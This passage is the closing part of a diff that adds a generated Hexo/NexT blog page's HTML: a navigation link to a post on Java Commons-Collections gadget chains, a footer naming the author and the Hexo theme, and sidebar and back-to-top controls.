+            </div>
+            <div class="post-nav-item">
+                <a href="/2025/10/15/Java%E6%94%BB%E9%98%B2/Java%E5%AE%89%E5%85%A8%E4%B9%8BCC%E9%93%BE%E6%80%BB%E8%A7%88/" rel="next" title="Java安全之CC链总览">
+                  Java安全之CC链总览 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2025</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">子非鱼</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/" rel="noopener" target="_blank">NexT.Gemini</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
